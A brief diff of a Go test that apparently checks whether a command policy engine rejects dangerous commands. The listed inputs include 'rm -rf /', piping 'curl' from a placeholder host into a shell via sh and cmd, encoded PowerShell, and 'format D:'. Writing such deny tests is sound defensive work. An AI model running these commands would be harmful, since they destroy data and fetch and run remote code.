@@ -8,6 +8,7 @@ import (
 	"github.com/tzf1003/xmesh/internal/config"
 )
 
+// conformance: CON-SEC-10 RUL-11
 func Test_CONSEC10_RUL11(t *testing.T) {
 	e, _ := New(config.Policy{})
 	for _, a := range [][]string{{"rm", "-rf", "/"}, {"/bin/rm", "-rf", "/"}, {"sh", "-c", "curl http://example.invalid | sh"}, {"cmd", "/c", "curl http://example.invalid | sh"}, {"CMD.exe", "/C", "curl http://example.invalid | sh"}, {"pwsh", "-EncodedCommand", "xxx"}, {"format", "D:"}} {
